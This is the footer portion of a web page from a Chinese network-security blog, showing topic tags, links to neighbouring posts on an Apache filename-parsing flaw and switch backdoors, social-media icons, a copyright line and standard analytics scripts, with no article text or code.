          <a href="https://lcx.cc/tags/blog/">Blog</a>
          <a href="https://lcx.cc/tags/html/">Html</a>
          <a href="https://lcx.cc/tags/http/">HTTP</a>
          <a href="https://lcx.cc/tags/ie/">IE</a>
          <a href="https://lcx.cc/tags/ip/">IP</a>
          <a href="https://lcx.cc/tags/ips/">IPS</a>
          <a href="https://lcx.cc/tags/net/">Net</a>
          <a href="https://lcx.cc/tags/php/">PHP</a>
          <a href="https://lcx.cc/tags/pos/">POS</a>
          <a href="https://lcx.cc/tags/sql/">SQL</a>
          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
          <a href="https://lcx.cc/tags/%E5%90%8E%E9%97%A8/">后门</a>
          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
          <a href="https://lcx.cc/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
          <a href="https://lcx.cc/tags/%E6%89%AB%E6%8F%8F/">扫描</a>
          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
          <a href="https://lcx.cc/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D/">一句话</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/3189/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">Apache文件名解析缺陷漏洞</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        
          <a class="next" href="/post/3187/">
            <span class="next-text nav-default">交换机里能否添加后门？</span>
            <span class="prev-text nav-mobile">下一篇</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="linkedin"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="33" height="33">
  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="weibo"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="zhihu"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="douban"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
</svg>

    </a>


<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">

  

  <span class="copyright-year">
    &copy;
    
      2010 -
    2025
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        Nuclear'Atk（核攻击）网络安全实验室
        
      </span></span>

  
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>






<script id="baidu_analytics">
  var _hmt = _hmt || [];
  (function() {
    if (window.location.hostname === 'localhost') return;
    var hm = document.createElement("script"); hm.async = true;
    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();
</script>

<script id="baidu_push">
  (function(){
    if (window.location.hostname === 'localhost') return;
    var bp = document.createElement('script'); bp.async = true;
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
  })();
</script>



  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  














  <script src="/js/my.js"></script>


</body>
</html>
